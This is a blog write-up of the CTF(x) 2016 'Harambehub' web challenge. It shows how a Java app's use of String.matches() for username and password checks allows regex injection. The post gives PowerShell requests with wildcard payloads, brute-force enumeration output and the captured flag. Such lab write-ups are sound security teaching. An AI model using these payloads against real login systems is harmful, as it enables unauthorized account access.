---
title: '[CTF(x) 2016 : WEB] Harambehub – 100 pts Writeup'
author: Megabeets
type: post
date: 2016-08-28T21:37:46+00:00
url: /ctfx-2016-web-harambehub-100-pts/
categories:
  - CTF(x)
  - Writeups
tags:
  - CTF
  - CTF(x)
  - Powershell
  - Web
  - Writeups

---
**Challenge description:**  
_This website was created in honor of harambe: http://problems.ctfx.io:7003_  
 _Problem author: omegablitz_  
[HarambeHub.java][1]  
[ _User.java_][2]

This challenge was the second in the Web category and it actually was the first time I’ve ever seen something like that. We are given with a url, which returns an empty page and two source-files written in Java for Spark Framework. Make sure you read the given source-files before you continue.

The main file, HarambeHub.java, contains two methods which are actually get() and post() routes to two different pages, as you can see below:

<pre lang="java" class="">public class HarambeHub {
    public static void main(String[] args) {
        post("/users", (req, res) -&gt; {
            String username = req.queryParams("username");
            String password = req.queryParams("password");
            String realName = req.queryParams("real_name");
           ...
        });
		
        get("/name", (req, res) -&gt; {
            String username = req.queryParams("username");
            String password = req.queryParams("password");
      	...
        });
    }
}
</pre>

Reading both source files we understand the application is capable of creating a new account and to retrieve the real_name of a user if you know its username and password.

Let’s try to register a new user, using a simple Powershell code:

<pre lang="powershell" class="">(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username="Megabeets"; password="VeggiesAreGood"; real_name="Itay Cohen"}).Content
</pre>

We results with “_OK: Your username is &#8220;[Member] Megabeets&#8221;_”. As you can see, the text “[Member] “ has been added to the username we supplied. By reading the function that handles the registration process we understand that we can register a user with that name again and again. Executing the exact same code results with the exact same answer: “_OK: Your username is &#8220;[Member] Megabeets&#8221;_”. Let’s try this again but this time with “[Member] Megabeets” in the username. Now we end up with an error saying: “_FAILED: User with that name already exists!_”.

Let’s take a look at the code that checks if a given username already exists:

<pre lang="java" class="">...
for (User user : User.users) {
                if(user.getUsername().matches(username)) {
                    return "FAILED: User with that name already exists!";
                }
            }
            new User("[Member]	 " + username, password, realName);
            return "OK: Your username is \"" + "[Member] " + username + "\"";
...
</pre>

As you can see, the code compares the two strings in attempt to check whether the username exists, but it uses String.matches() instead of String.equals(). The method String.matches() checks the match of a string to a regular rxpression pattern. Keep this in mind, it’s the key to solving the challenge. If false is returned, it creates a new User with the username “[Member] <username>”, just as we’ve seen before.

But what happens if we try to register a user with a regular expression as its desired username? Does it say that the username already exists? Let’s play with it a little bit and see what we get when sending “.\*” as the password (“.\*” is the regex pattern to **anything)**.

<pre lang="powershell" class="">(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username=".*"; password="VeggiesAreGood"; real_name="Itay Cohen"}).Content
</pre>

As expected, we received the error: &#8220;FAILED: User with that name already exists!&#8221;.

Now let’s take a look at the function that retrieves the real_name of a given username.

<pre lang="java" class="">public boolean verify(String username, String password) {
        return this.username.equals(username) && this.master.matches(password);
    }
</pre>

This function also uses String.matches() to compare the given password with the user’s password. Let’s see it in action:

<pre lang="powershell" class="">Invoke-WebRequest "http://problems.ctfx.io:7003/name" -Method Get -Body @{username="[Member] Megabeets"; password="VeggiesAreGood"}
</pre>

We results with: “_Itay Cohen_”.

Good. Now we’ll send the same request but this time with wildcard as the password.

<pre lang="powershell">Invoke-WebRequest "http://problems.ctfx.io:7003/name" -Method Get -Body @{username="[Member] Megabeets"; password=".*"}
</pre>

We again results with: “_Itay Cohen_”.

Let’s sum up what we have understood until now:

  1. We can get the real_name of any user if we know its username.
  2. We can understand if username already exists by using regular expressions.

That’s mean that we need to run through all the possible usernames till we find the user which his password is the flag. My gut feeling tells me the username will probably start with “[Admin]”.

I’ll do a simple test to check whether indeed a user begins with “[Admin]” exists. If so, only the developer can add a user with such a username because every registered username is prepend with “[Member]”.

<pre lang="powershell">(Invoke-WebRequest "http://problems.ctfx.io:7003/users" -Method POST -Body @{username="^\[Admin\].*"; password="pass"; real_name="Itay Cohen"}).Content
</pre>

“_FAILED: User with that name already exists!_”.

I wrote a simple script to automate the process. May the bruteforce be with us.



Results:

<pre class="theme:inlellij-idea">Match found: \[Admin\] A
Match found: \[Admin\] Ar
Match found: \[Admin\] Arx
Match found: \[Admin\] Arxe
Match found: \[Admin\] Arxen
Match found: \[Admin\] Arxeni
Match found: \[Admin\] Arxenix
Match found: \[Admin\] Arxenixi
Match found: \[Admin\] Arxenixis
Match found: \[Admin\] Arxenixisa
Match found: \[Admin\] Arxenixisal
Match found: \[Admin\] Arxenixisalo
Match found: \[Admin\] Arxenixisalos
Match found: \[Admin\] Arxenixisalose
Match found: \[Admin\] Arxenixisaloser
</pre>

It seems like we’ve found the username. Let’s get its real_name:

<pre lang="powershell" class="">(Invoke-WebRequest "http://problems.ctfx.io:7003/name?username=\[Admin\] Arxenixisaloser; password=.*").content
</pre>

And we got the flag:

_ctf(h4r4mb3\_d1dn1t\_d13\_4\_th1s\_f33ls\_b4d)_

<p style="text-align: right;">
  <img src="../uploads/megabeets_inline_logo.png" />Eat Veggies.
</p>

<img decoding="async" loading="lazy" class="alignleft" src="http://www.gannett-cdn.com/-mm-/748c68a68596b4b3be54484af8d31875e45f9fe5/c=179-0-2659-3307&r=537&c=0-0-534-712/local/-/media/2016/05/29/Cincinnati/Cincinnati/636001135964333349-Harambe2.jpg" width="172" height="209" /> 

**Harambe the Gorilla** was a 17-year-old Western lowland silverback gorilla who was shot and killed at the Cincinnati Zoo after a child fell into his enclosure in late May 2016. The incident was wildly criticized online by many who blamed the child’s parents for the gorilla’s untimely death.

**RIP Harambe.**

<div class="nf-post-footer">
  <p style="text-align: right">
    <a href="https://www.megabeets.net/about.html#vegan"><img src="../uploads/megabeets_inline_logo.png" />Eat Veggies</a>
  </p>
</div>

 [1]: https://gist.github.com/ITAYC0HEN/5df90c37fcdd78196778475e67011f7a
 [2]: https://gist.github.com/ITAYC0HEN/ad92229f6ae7f5fdf3c47ec752959b7e